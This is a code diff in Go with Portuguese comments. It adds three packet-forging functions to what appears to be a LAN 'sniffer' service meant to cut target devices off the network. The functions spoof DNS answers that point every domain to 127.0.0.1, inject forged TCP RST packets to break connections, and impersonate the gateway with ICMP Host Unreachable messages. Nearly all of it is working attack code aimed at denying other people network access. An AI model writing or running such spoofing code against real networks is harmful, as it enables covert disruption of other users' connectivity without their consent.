@@ -512,6 +512,197 @@ func (s *SnifferService) DeactivateBlackHole(targetIPs []string) {
 	}
 }
 
+// forgeDNSResponse forja uma resposta DNS falsa apontando qualquer domínio para 127.0.0.1.
+// Usado pelo modo DNS Sinkholing para silenciosamente destruir a resolução de nomes do alvo.
+// O alvo mantém o ícone de WiFi conectado, mas nenhum site abre.
+func (s *SnifferService) forgeDNSResponse(handle *pcap.Handle, pktData []byte, myMAC, targetMAC net.HardwareAddr) {
+	pkt := gopacket.NewPacket(pktData, layers.LayerTypeEthernet, gopacket.Default)
+
+	ipv4Layer := pkt.Layer(layers.LayerTypeIPv4)
+	udpLayer := pkt.Layer(layers.LayerTypeUDP)
+	dnsLayer := pkt.Layer(layers.LayerTypeDNS)
+
+	if ipv4Layer == nil || udpLayer == nil || dnsLayer == nil {
+		return
+	}
+
+	ipv4, _ := ipv4Layer.(*layers.IPv4)
+	udp, _ := udpLayer.(*layers.UDP)
+	dns, _ := dnsLayer.(*layers.DNS)
+
+	if dns.OpCode != layers.DNSOpCodeQuery || len(dns.Questions) == 0 {
+		return
+	}
+
+	// Constrói a resposta DNS forjada
+	eth := layers.Ethernet{
+		SrcMAC:       myMAC,
+		DstMAC:       targetMAC,
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+
+	ip := layers.IPv4{
+		Version:  4,
+		TTL:      64,
+		SrcIP:    ipv4.DstIP, // Finge ser o servidor DNS
+		DstIP:    ipv4.SrcIP, // Para o alvo
+		Protocol: layers.IPProtocolUDP,
+	}
+
+	respUDP := layers.UDP{
+		SrcPort: udp.DstPort, // Da porta 53
+		DstPort: udp.SrcPort, // Para a porta do alvo
+	}
+	respUDP.SetNetworkLayerForChecksum(&ip)
+
+	// Monta a resposta DNS com o domínio apontando para 127.0.0.1
+	sinkIP := net.ParseIP("127.0.0.1").To4()
+	dnsResp := layers.DNS{
+		ID:           dns.ID,
+		QR:           true,
+		OpCode:       layers.DNSOpCodeQuery,
+		AA:           true,
+		ResponseCode: layers.DNSResponseCodeNoErr,
+		QDCount:      uint16(len(dns.Questions)),
+		ANCount:      1,
+		Questions:    dns.Questions,
+		Answers: []layers.DNSResourceRecord{
+			{
+				Name:  dns.Questions[0].Name,
+				Type:  layers.DNSTypeA,
+				Class: layers.DNSClassIN,
+				TTL:   300,
+				IP:    sinkIP,
+			},
+		},
+	}
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &ip, &respUDP, &dnsResp); err != nil {
+		return
+	}
+
+	_ = handle.WritePacketData(buf.Bytes())
+}
+
+// forgeTCPRST forja um pacote TCP RST para derrubar imediatamente uma conexão TCP.
+// Envia um RST falsificando o IP do servidor de destino, fazendo o alvo achar que o servidor fechou a conexão.
+func (s *SnifferService) forgeTCPRST(handle *pcap.Handle, pktData []byte, myMAC, targetMAC net.HardwareAddr) {
+	pkt := gopacket.NewPacket(pktData, layers.LayerTypeEthernet, gopacket.Default)
+
+	ipv4Layer := pkt.Layer(layers.LayerTypeIPv4)
+	tcpLayer := pkt.Layer(layers.LayerTypeTCP)
+
+	if ipv4Layer == nil || tcpLayer == nil {
+		return
+	}
+
+	ipv4, _ := ipv4Layer.(*layers.IPv4)
+	tcp, _ := tcpLayer.(*layers.TCP)
+
+	// Constrói o RST falsificando o servidor
+	eth := layers.Ethernet{
+		SrcMAC:       myMAC,
+		DstMAC:       targetMAC,
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+
+	ip := layers.IPv4{
+		Version:  4,
+		TTL:      64,
+		SrcIP:    ipv4.DstIP, // Finge ser o servidor
+		DstIP:    ipv4.SrcIP, // Para o alvo
+		Protocol: layers.IPProtocolTCP,
+	}
+
+	// Calcula o ACK correto baseado no pacote interceptado
+	ackNum := tcp.Seq
+	if tcp.SYN || tcp.FIN {
+		ackNum++ // SYN e FIN consomem 1 número de sequência
+	}
+	ackNum += uint32(len(tcp.Payload))
+
+	rstTCP := layers.TCP{
+		SrcPort: tcp.DstPort,
+		DstPort: tcp.SrcPort,
+		RST:     true,
+		ACK:     true,
+		Seq:     tcp.Ack,
+		Ack:     ackNum,
+		Window:  0,
+	}
+	rstTCP.SetNetworkLayerForChecksum(&ip)
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &ip, &rstTCP); err != nil {
+		return
+	}
+
+	_ = handle.WritePacketData(buf.Bytes())
+}
+
+// forgeICMPUnreachable forja um pacote ICMP Tipo 3 Código 1 (Host Unreachable).
+// Falsifica a origem como se fosse o Gateway, fazendo o SO do alvo acreditar
+// que a rota sumiu e cancelar conexões instantaneamente no nível de Socket.
+func (s *SnifferService) forgeICMPUnreachable(handle *pcap.Handle, pktData []byte, myMAC, targetMAC net.HardwareAddr, gatewayIP net.IP) {
+	pkt := gopacket.NewPacket(pktData, layers.LayerTypeEthernet, gopacket.Default)
+
+	ipv4Layer := pkt.Layer(layers.LayerTypeIPv4)
+	if ipv4Layer == nil {
+		return
+	}
+
+	ipv4, _ := ipv4Layer.(*layers.IPv4)
+
+	eth := layers.Ethernet{
+		SrcMAC:       myMAC,
+		DstMAC:       targetMAC,
+		EthernetType: layers.EthernetTypeIPv4,
+	}
+
+	ip := layers.IPv4{
+		Version:  4,
+		TTL:      64,
+		SrcIP:    gatewayIP,  // Finge ser o gateway
+		DstIP:    ipv4.SrcIP, // Para o alvo
+		Protocol: layers.IPProtocolICMPv4,
+	}
+
+	icmp := layers.ICMPv4{
+		TypeCode: layers.CreateICMPv4TypeCode(3, 1), // Destination Unreachable, Host Unreachable
+	}
+
+	// ICMP Unreachable deve incluir o cabeçalho IP original + 8 primeiros bytes do payload
+	ihl := int(ipv4.IHL) * 4
+	originalIPStart := 14 // Após cabeçalho Ethernet
+	endOffset := originalIPStart + ihl + 8
+	if endOffset > len(pktData) {
+		endOffset = len(pktData)
+	}
+
+	buf := gopacket.NewSerializeBuffer()
+	opts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	if err := gopacket.SerializeLayers(buf, opts, &eth, &ip, &icmp, gopacket.Payload(pktData[originalIPStart:endOffset])); err != nil {
+		return
+	}
+
+	_ = handle.WritePacketData(buf.Bytes())
+}
+
 // findActiveInterface retorna o nome e IP da interface de rede ativa.
 func (s *SnifferService) findActiveInterface() (string, string) {
 	devices, err := pcap.FindAllDevs()
